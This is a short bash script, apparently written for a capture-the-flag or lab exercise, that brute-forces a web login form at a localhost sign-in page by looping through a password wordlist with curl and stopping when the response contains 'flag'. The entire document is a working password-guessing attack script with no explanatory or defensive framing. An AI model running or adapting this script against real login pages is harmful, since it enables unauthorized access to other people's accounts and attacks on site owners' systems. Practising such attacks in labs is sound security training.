#!/bin/bash

PASSWORD_FILE="./password-list.txt"
URL="http://localhost:8080/index.php?page=signin"
USERNAME=""
SUCCESS_INDICATOR="flag"

if [ ! -f "$PASSWORD_FILE" ]; then
    echo "Password file not found: $PASSWORD_FILE"
    exit 1
fi

echo "[*] Starting brute-force on $URL with username '$USERNAME'..."

while IFS= read -r PASSWORD; do
    RESPONSE=$(curl -s -X POST "$URL&username=$USERNAME&password=$PASSWORD&Login=Login")

    if echo "$RESPONSE" | grep -q "$SUCCESS_INDICATOR"; then
        echo "[+] Password found: $PASSWORD"
        exit 0
    else
        echo "[-] Tried: $PASSWORD"
    fi
done < "$PASSWORD_FILE"

echo "[!] Brute-force complete. Password not found."
